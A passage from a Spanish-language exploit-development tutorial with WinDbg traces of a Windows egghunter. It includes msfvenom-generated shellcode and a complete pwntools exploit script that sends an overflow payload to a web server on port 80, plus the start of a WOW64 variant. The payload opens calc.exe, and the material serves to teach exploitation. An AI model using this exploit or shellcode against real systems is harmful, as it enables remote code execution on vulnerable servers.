eip=01c8ea8d esp=01c8ea24 ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246  
01c8ea8d 31d2            xor     edx,edx

</span><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=018f2aa8 ecx=0000000e edx=00000000 esi=018f2aa8 edi=0041703c  
eip=01c8ea8f esp=01c8ea24 ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246  
01c8ea8f 6681caff0f      or      dx,0FFFh

</span><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=018f2aa8 ecx=0000000e edx=00000fff esi=018f2aa8 edi=0041703c  
eip=01c8ea94 esp=01c8ea24 ebp=41414141 iopl=0         nv up ei pl nz na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206  
01c8ea94 42              inc     edx

</span><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=018f2aa8 ecx=0000000e edx=00001000 esi=018f2aa8 edi=0041703c  
eip=01c8ea95 esp=01c8ea24 ebp=41414141 iopl=0         nv up ei pl nz ac pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216  
01c8ea95 52              push    edx</span>
</code></pre></div></div><br>

<p class="plain-text">Guarda el valor actual de edx y establece el valor de <code class="language-plaintext highlighter-rouge">eax</code> al syscall NR que en el caso de la función NtAccessCheckAndAuditAlarm es <code class="language-plaintext highlighter-rouge">0x1c6</code>, seguido a ello hace la syscall</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
eax=00000000 ebx=018f2aa8 ecx=0000000e edx=00001000 esi=018f2aa8 edi=0041703c  
eip=01c8ea95 esp=01c8ea24 ebp=41414141 iopl=0         nv up ei pl nz ac pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216  
01c8ea95 52              push    edx

</span><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=018f2aa8 ecx=0000000e edx=00001000 esi=018f2aa8 edi=0041703c  
eip=01c8ea96 esp=01c8ea20 ebp=41414141 iopl=0         nv up ei pl nz ac pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216  
01c8ea96 31c0            xor     eax,eax

</span><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=018f2aa8 ecx=0000000e edx=00001000 esi=018f2aa8 edi=0041703c  
eip=01c8ea98 esp=01c8ea20 ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246  
01c8ea98 66b8c901        mov     ax,1C6h

</span><span class="ro">0:000> </span><span class="p">p
eax=000001c6 ebx=018f2aa8 ecx=0000000e edx=00001000 esi=018f2aa8 edi=0041703c  
eip=01c8ea9c esp=01c8ea20 ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246  
01c8ea9c cd2e            int     2Eh

</span><span class="ro">0:000> </span><span class="p">p
eax=c0000005 ebx=018f2aa8 ecx=01c8ea20 edx=01c8ea9e esi=018f2aa8 edi=0041703c  
eip=01c8ea9e esp=01c8ea20 ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246  
01c8ea9e 3c05            cmp     al,5</span>
</code></pre></div></div><br>

<p class="plain-text">Compara el valor devuelto en eax con <code class="language-plaintext highlighter-rouge">0xc0000005</code>, si ese es el valor la dirección no es valida por lo que vuelve a aumentar el valor en <code class="language-plaintext highlighter-rouge">0x1000</code> y repite el proceso de nuevo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
eax=c0000005 ebx=018f2aa8 ecx=01c8ea20 edx=01c8ea9e esi=018f2aa8 edi=0041703c
eip=01c8ea9e esp=01c8ea20 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
01c8ea9e 3c05            cmp     al,5

</span><span class="ro">0:000> </span><span class="p">p
eax=c0000005 ebx=018f2aa8 ecx=01c8ea20 edx=01c8ea9e esi=018f2aa8 edi=0041703c
eip=01c8eaa0 esp=01c8ea20 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
01c8eaa0 5a              pop     edx

</span><span class="ro">0:000> </span><span class="p">p
eax=c0000005 ebx=018f2aa8 ecx=01c8ea20 edx=00001000 esi=018f2aa8 edi=0041703c
eip=01c8eaa1 esp=01c8ea24 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
01c8eaa1 74ea            je      01c8ea8f                                [br=1]  

</span><span class="ro">0:000> </span><span class="p">u 01c8ea8f
01c8ea8f 6681caff0f      or      dx,0FFFh
01c8ea94 42              inc     edx
01c8ea95 52              push    edx
01c8ea96 31c0            xor     eax,eax
01c8ea98 66b8c901        mov     ax,1C6h
01c8ea9c cd2e            int     2Eh
01c8ea9e 3c05            cmp     al,5</span>
</code></pre></div></div><br>

<p class="plain-text">Cuando la dirección es válida el valor devuelto será diferente por lo que no se cumple la condición y <code class="language-plaintext highlighter-rouge">je</code> no saltará a aumentar la página y seguira con el flujo normal</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> r
eax=c000005c ebx=01a92aa8 ecx=0392ea20 edx=003a1000 esi=01a92aa8 edi=0041703c
eip=0392eaa1 esp=0392ea24 ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
0392eaa1 74ec            je      0392ea8f                                [br=0]

</span><span class="ro">0:000> </span><span class="p">p
eax=c000005c ebx=01a92aa8 ecx=0392ea20 edx=003a1000 esi=01a92aa8 edi=0041703c
eip=0392eaa3 esp=0392ea24 ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
0392eaa3 b877303074      mov     eax,74303077h</span>
</code></pre></div></div><br>

<p class="plain-text">Después de ello guarda en eax los bytes en hex de la cadena <code class="language-plaintext highlighter-rouge">w00t</code> y en edi la dirección, usando <code class="language-plaintext highlighter-rouge">scasd</code> compara el valor de eax con el contenido dentro de <code class="language-plaintext highlighter-rouge">edi</code>, pero como ahora mismo el valor de edi es <code class="language-plaintext highlighter-rouge">0x00400000</code> la comparación fallará</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
eax=c000005c ebx=001a2aa8 ecx=01adea20 edx=00400000 esi=001a2aa8 edi=0041703c
eip=01adeaa3 esp=01adea24 ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
01adeaa3 b877303074      mov     eax,74303077h

</span><span class="ro">0:000> </span><span class="p">p
eax=74303077 ebx=001a2aa8 ecx=01adea20 edx=00400000 esi=001a2aa8 edi=0041703c
eip=01adeaa8 esp=01adea24 ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
01adeaa8 89d7            mov     edi,edx

</span><span class="ro">0:000> </span><span class="p">p
eax=74303077 ebx=001a2aa8 ecx=01adea20 edx=00400000 esi=001a2aa8 edi=00400000
eip=01adeaaa esp=01adea24 ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
01adeaaa af              scas    dword ptr es:[edi]   es:0023:00400000=00905a4d  

</span><span class="ro">0:000> </span><span class="p">db 0x00400000 L4
00400000  4d 5a 90 00                                      MZ..</span>
</code></pre></div></div><br>

<p class="plain-text">Si la comparación falla es que aun no ha encontrado el huevo que enviamos antes del shellcode por lo que volvera a incrementar la dirección en una unidad</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
eax=74303077 ebx=001a2aa8 ecx=01adea20 edx=00400000 esi=001a2aa8 edi=00400000
eip=01adeaaa esp=01adea24 ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
01adeaaa af              scas    dword ptr es:[edi]   es:0023:00400000=00905a4d  

</span><span class="ro">0:000> </span><span class="p">p
eax=74303077 ebx=001a2aa8 ecx=01adea20 edx=00400000 esi=001a2aa8 edi=00400004
eip=01adeaab esp=01adea24 ebp=41414141 iopl=0         nv up ei pl nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
01adeaab 75e7            jne     01adea94                                [br=1]  

</span><span class="ro">0:000> </span><span class="p">u 01adea94
01adea94 42              inc     edx
01adea95 52              push    edx
01adea96 31c0            xor     eax,eax
01adea98 66b8c901        mov     ax,1C6h
01adea9c cd2e            int     2Eh
01adea9e 3c05            cmp     al,5
01adeaa0 5a              pop     edx
01adeaa1 74ec            je      01adea8f</span>
</code></pre></div></div><br>

<p class="plain-text">Para ahorrar tiempo buscaremos el huevo en toda la memoria y la dirección donde sabemos que esta la guardaremos en <code class="language-plaintext highlighter-rouge">edi</code> para asi cumplir la condición</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">s -a 0 L?80000000 w00tw00t
03be8183  77 30 30 74 77 30 30 74-43 43 43 43 43 43 43 43  w00tw00tCCCCCCCC  

</span><span class="ro">0:000> </span><span class="p">r edi=0x03be8183</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora cuando compara el contenido de <code class="language-plaintext highlighter-rouge">edi</code> con <code class="language-plaintext highlighter-rouge">eax</code> la condicion se cumple por lo que no aumentara la dirección sino que seguira con el flujo del programa</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
eax=74303077 ebx=001a2aa8 ecx=037dea20 edx=00400001 esi=001a2aa8 edi=03be8183
eip=037deaaa esp=037dea24 ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
037deaaa af              scas    dword ptr es:[edi]   es:0023:03be8183=74303077

</span><span class="ro">0:000> </span><span class="p">p
eax=74303077 ebx=001a2aa8 ecx=037dea20 edx=00400001 esi=001a2aa8 edi=03be8187
eip=037deaab esp=037dea24 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
037deaab 75e7            jne     037dea94                                [br=0]

</span><span class="ro">0:000> </span><span class="p">p
eax=74303077 ebx=001a2aa8 ecx=037dea20 edx=00400001 esi=001a2aa8 edi=03be8187
eip=037deaad esp=037dea24 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
037deaad af              scas    dword ptr es:[edi]   es:0023:03be8187=743030773</span>
</code></pre></div></div><br>

<p class="plain-text">Si lo encuentra una vez volvera a comprobar que los siguientes <code class="language-plaintext highlighter-rouge">bytes</code> son nuevamente del huevo, esto como dijimos antes se hace para evitar falsos positivos, si la comparación es igual la siguiente instrucción saltará al registro <code class="language-plaintext highlighter-rouge">edi</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
eax=74303077 ebx=001a2aa8 ecx=037dea20 edx=00400001 esi=001a2aa8 edi=03be8187
eip=037deaad esp=037dea24 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
037deaad af              scas    dword ptr es:[edi]   es:0023:03be8187=74303077  

</span><span class="ro">0:000> </span><span class="p">db edi L10
03e8c19f  77 30 30 74 43 43 43 43-43 43 43 43 43 43 43 43  w00tCCCCCCCCCCCC

</span><span class="ro">0:000> </span><span class="p">p
eax=74303077 ebx=001a2aa8 ecx=037dea20 edx=00400001 esi=001a2aa8 edi=03be818b
eip=037deaae esp=037dea24 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
037deaae 75e4            jne     037dea94                                [br=0]  

</span><span class="ro">0:000> </span><span class="p">p
eax=74303077 ebx=001a2aa8 ecx=037dea20 edx=00400001 esi=001a2aa8 edi=03be818b
eip=037deab0 esp=037dea24 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
037deab0 ffe7            jmp     edi {03be818b}</span>
</code></pre></div></div><br>

<p class="plain-text">Y como el registro <code class="language-plaintext highlighter-rouge">edi</code> apunta a nuestro <code class="language-plaintext highlighter-rouge">shellcode</code> cuando salte ejecutará las instrucciones que enviemos después del huevo, asi logramos ejecutar el shellcode</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">db edi
03be818b  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
03be819b  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
03be81ab  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
03be81bb  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
03be81cb  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
03be81db  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
03be81eb  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
03be81fb  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC

</span><span class="ro">0:000> </span><span class="p">p
eax=74303077 ebx=001a2aa8 ecx=037dea20 edx=00400001 esi=001a2aa8 edi=03be818b  
eip=03be818b esp=037dea24 ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246  
03be818b 43              inc     ebx</span>
</code></pre></div></div><br>

<p class="plain-text">Ya que tenemos una forma de ejecutar instrucciones podemos generar un shellcode con <code class="language-plaintext highlighter-rouge">msfvenom</code> que en caso de interpretarse ejecute el comando <code class="language-plaintext highlighter-rouge">calc.exe</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ msfvenom </span><span class="p">-p windows/exec CMD=calc.exe -f python -v shellcode -b </span><span class="am">'\x00\x0a\x0d'</span><span class="p"> -e x86/jmp_call_additive  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/jmp_call_additive
x86/jmp_call_additive succeeded with size 225 (iteration=0)
x86/jmp_call_additive chosen with final size 225
Payload size: 225 bytes
Final size of python file: 1274 bytes
shellcode =  b""
shellcode += b"\xfc\xbb\xb5\xf0\xa4\xca\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\x49\x18\x26\xca\xb1\xd9\x47\x42"
shellcode += b"\x54\xe8\x47\x30\x1d\x5b\x78\x32\x73\x50\xf3"
shellcode += b"\x16\x67\xe3\x71\xbf\x88\x44\x3f\x99\xa7\x55"
shellcode += b"\x6c\xd9\xa6\xd5\x6f\x0e\x08\xe7\xbf\x43\x49"
shellcode += b"\x20\xdd\xae\x1b\xf9\xa9\x1d\x8b\x8e\xe4\x9d"
shellcode += b"\x20\xdc\xe9\xa5\xd5\x95\x08\x87\x48\xad\x52"
shellcode += b"\x07\x6b\x62\xef\x0e\x73\x67\xca\xd9\x08\x53"
shellcode += b"\xa0\xdb\xd8\xad\x49\x77\x25\x02\xb8\x89\x62"
shellcode += b"\xa5\x23\xfc\x9a\xd5\xde\x07\x59\xa7\x04\x8d"
shellcode += b"\x79\x0f\xce\x35\xa5\xb1\x03\xa3\x2e\xbd\xe8"
shellcode += b"\xa7\x68\xa2\xef\x64\x03\xde\x64\x8b\xc3\x56"
shellcode += b"\x3e\xa8\xc7\x33\xe4\xd1\x5e\x9e\x4b\xed\x80"
shellcode += b"\x41\x33\x4b\xcb\x6c\x20\xe6\x96\xfa\xb7\x74"
shellcode += b"\xad\x49\xb7\x86\xad\xfd\xd0\xb7\x26\x92\xa7"
shellcode += b"\x47\xed\xd6\x58\x02\xaf\x7f\xf1\xcb\x3a\xc2"
shellcode += b"\x9c\xeb\x91\x01\x99\x6f\x13\xfa\x5e\x6f\x56"
shellcode += b"\xff\x1b\x37\x8b\x8d\x34\xd2\xab\x22\x34\xf7"
shellcode += b"\xc8\xa5\xa6\x9b\x20\x43\x4f\x39\x3c\x8b\xaf"
shellcode += b"\xc1\x3c\x8b\xaf\xc1"</span>
</code></pre></div></div><br>

<p class="plain-text">El exploit final guardará el huevo <code class="language-plaintext highlighter-rouge">w00tw00t</code> seguido del shellcode en algun lugar de la memoria y al ejecutar el <code class="language-plaintext highlighter-rouge">egghunter</code> este lo buscara y cuando lo encuentre lo ejecutará</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32, asm

egg </span><span class="o">= </span><span class="no">b</span><span class="s">"w00t" </span><span class="o">* </span><span class="mi">2</span><span class="p">
egghunter </span><span class="o">= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x31\xd2\x66\x81\xca\xff\x0f\x42\x52\x31\xc0\x66\xb8\xc9\x01\xcd\x2e\x3c\x05\x5a\x74\xec\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7</span><span class="s">"</span><span class="p">  

shellcode </span><span class="o">=  </span><span class="no">b</span><span class="s">""</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xfc\xbb\xc2\x02\xd8\xe2\xeb\x0c\x5e\x56\x31</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xff\xff\xff\x3e\xea\x5a\xe2\xbe\xeb\x3a\x6a</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x5b\xda\x7a\x08\x28\x4d\x4b\x5a\x7c\x62\x20</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x0e\x94\xf1\x44\x87\x9b\xb2\xe3\xf1\x92\x43</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x5f\xc1\xb5\xc7\xa2\x16\x15\xf9\x6c\x6b\x54</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x3e\x90\x86\x04\x97\xde\x35\xb8\x9c\xab\x85</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x33\xee\x3a\x8e\xa0\xa7\x3d\xbf\x77\xb3\x67</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x1f\x76\x10\x1c\x16\x60\x75\x19\xe0\x1b\x4d</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xd5\xf3\xcd\x9f\x16\x5f\x30\x10\xe5\xa1\x75</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x97\x16\xd4\x8f\xeb\xab\xef\x54\x91\x77\x65</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x4e\x31\xf3\xdd\xaa\xc3\xd0\xb8\x39\xcf\x9d</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xcf\x65\xcc\x20\x03\x1e\xe8\xa9\xa2\xf0\x78</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xe9\x80\xd4\x21\xa9\xa9\x4d\x8c\x1c\xd5\x8d</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x6f\xc0\x73\xc6\x82\x15\x0e\x85\xc8\xe8\x9c</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xb0\xbf\xeb\x9e\xba\xef\x83\xaf\x31\x60\xd3</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x2f\x90\xc4\x2b\x7a\xb8\x6d\xa4\x23\x29\x2c</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xa9\xd3\x84\x73\xd4\x57\x2c\x0c\x23\x47\x45</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x09\x6f\xcf\xb6\x63\xe0\xba\xb8\xd0\x01\xef</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xdb\xb7\x91\x73\x35\x5d\x12\x11\x49\x9d\xe2</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xd9\x49\x9d\xe2\xd9</span><span class="s">"</span><span class="p">

offset </span><span class="o">= </span><span class="mi">253</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">(offset </span><span class="o">- </span><span class="no">len</span><span class="p">(egghunter))

ret </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x00418674</span><span class="p">)

payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
payload </span><span class="o">+= </span><span class="p">egghunter
payload </span><span class="o">+= </span><span class="p">junk
payload </span><span class="o">+= </span><span class="p">ret

method </span><span class="o"> = </span><span class="no">b</span><span class="s">""</span><span class="p">
method </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"xor eax, eax"</span><span class="p">)
method </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"jle $+0x17"</span><span class="p">)

content  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
content </span><span class="o">+= </span><span class="p">method </span><span class="o">+ </span><span class="no">b</span><span class="s">" /" </span><span class="o">+ </span><span class="p">payload </span><span class="o">+ </span><span class="no">b</span><span class="s">"</span><span class="mi">\r\n\r\n</span><span class="s">"</span><span class="p">
content </span><span class="o">+= </span><span class="p">egg </span><span class="o">+ </span><span class="p">shellcode

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">80</span><span class="p">)
shell.sendline(content)</span>
</code></pre></div></div><br>

<p class="plain-text">Como resultado conseguimos controlar el programa y ejecutar el shellcode que ejecuta el comando <code class="language-plaintext highlighter-rouge">calc.exe</code> por lo que se abre una calculadora en la maquina</p>
<a href="/exploitdevelopment/user-mode/egghunters/2.png" target="_blank"><div><p><img src="/exploitdevelopment/user-mode/egghunters/2.png"></p></div></a>

</section>

<section class="post" id="wow64">
<br><h3 class="post-title">6.7 - EggHunter wow64</h3><br>

<p class="plain-text">El egghunter funciona en un <code class="language-plaintext highlighter-rouge">Windows 10 x86</code> pero ¿que pasa si corremos un programa <code class="language-plaintext highlighter-rouge">x86</code> en un sistema operativo <code class="language-plaintext highlighter-rouge">x64</code>? pues no funciona, nos da un error de acceso al ejecutar la llamada al sistema, esto pasa porque en x64 no podemos hacer una llamada al sistema con una interrupción, tendremos que buscar alternativas</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
(1cd0.1d20): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=000001c6 ebx=02352ca0 ecx=0000000e edx=00001000 esi=02352ca0 edi=0041703c  
eip=043dea9c esp=043dea20 ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246  
043dea9c cd2e            int     2Eh

</span><span class="ro">0:000> </span><span class="p">p
(1cd0.1d20): Access violation - code c0000005 (!!! second chance !!!)
eax=000001c6 ebx=02352ca0 ecx=0000000e edx=00001000 esi=02352ca0 edi=0041703c  
eip=043dea9c esp=043dea20 ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246  
043dea9c cd2e            int     2Eh</span>
</code></pre></div></div><br>

<p class="plain-text">Para no tener que trabajar desde <code class="language-plaintext highlighter-rouge">savant</code> podemos compilar el codigo asm en un <code class="language-plaintext highlighter-rouge">.exe</code> y abrirlo en <code class="language-plaintext highlighter-rouge">windbg</code> indicando que queremos usar la arquitectura <code class="language-plaintext highlighter-rouge">x64</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ nasm</span><span class="p"> -f elf egghunter.asm -o egghunter.o
</span><span class="ve">❯ ld </span><span class="p">egghunter.o -m i386pe -o egghunter.exe  </span>
</code></pre></div></div><br>

<a href="/exploitdevelopment/user-mode/egghunters/3.png" target="_blank"><div><p><img src="/exploitdevelopment/user-mode/egghunters/3.png"></p></div></a>

<p class="plain-text">El egghunter al ser un programa compilado en <code class="language-plaintext highlighter-rouge">x86</code> en un sistema <code class="language-plaintext highlighter-rouge">x64</code> podemos ver 2 versiones de cada modulo como <code class="language-plaintext highlighter-rouge">ntdll.dll</code> acompañado de <code class="language-plaintext highlighter-rouge">ntdll32.dll</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
(1cc8.296c): WOW64 breakpoint - code 4000001f (first chance)
First chance exceptions are reported before any exception handling.  
This exception may be expected and handled.
ntdll32!LdrpDoDebuggerBreak+0x2b:
77e48107 cc              int     3

</span><span class="ro">0:000:x86> </span><span class="p">lm
start    end        module name
00c20000 00c23000   egghunter   (deferred)             
764d0000 76744000   KERNELBASE   (deferred)             
77500000 775f0000   KERNEL32   (deferred)             
77d80000 77d8a000   wow64cpu   (deferred)             
77d90000 77f41000   ntdll32    (pdb symbols)
8fd00000 8fd09000   wow64base   (deferred)             
904f0000 90547000   wow64      (deferred)             
909c0000 90a4b000   wow64win   (deferred)             
90a50000 90a66000   wow64con   (deferred)             
00007ffe`914d0000 00007ffe`916e6000   ntdll      (pdb symbols)</span>
</code></pre></div></div><br>

<p class="plain-text">En sistemas <code class="language-plaintext highlighter-rouge">x64</code> el syscall NR de NtAccessCheckAndAuditAlarm se ha mantenido bastante estatico entre versiones, este ha sido <code class="language-plaintext highlighter-rouge">0x29</code> hasta las versiones actuales</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000:x86> </span><span class="p">u ntdll32!NtAccessCheckAndAuditAlarm
ntdll32!NtAccessCheckAndAuditAlarm:
77e06a00 b829000000      mov     eax,29h
77e06a05 ba6091e277      mov     edx,offset ntdll32!Wow64SystemServiceCall (77e29160)  
77e06a0a ffd2            call    edx
77e06a0c c22c00          ret     2Ch
77e06a0f 90              nop
ntdll32!NtUnmapViewOfSection:
77e06a10 b82a000000      mov     eax,2Ah
77e06a15 ba6091e277      mov     edx,offset ntdll32!Wow64SystemServiceCall (77e29160)  
77e06a1a ffd2            call    edx</span>
</code></pre></div></div><br>

<p class="plain-text">¿Como hacer una llamada al sistema sin <code class="language-plaintext highlighter-rouge">int</code>? dentro de la estructura <code class="language-plaintext highlighter-rouge">TEB</code> con un offset de <code class="language-plaintext highlighter-rouge">0xc0</code> podemos ver un puntero llamado <code class="language-plaintext highlighter-rouge">WOW32Reserved</code>, esto apunta hacia hacia <code class="language-plaintext highlighter-rouge">wow64cpu!KiFastSystemCall</code> que podemos usar para hacer la llamada</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000:x86> </span><span class="p">dt ntdll32!_TEB
   +0x000 NtTib            : _NT_TIB
   +0x01c EnvironmentPointer : Ptr32 Void
   +0x020 ClientId         : _CLIENT_ID
   +0x028 ActiveRpcHandle  : Ptr32 Void
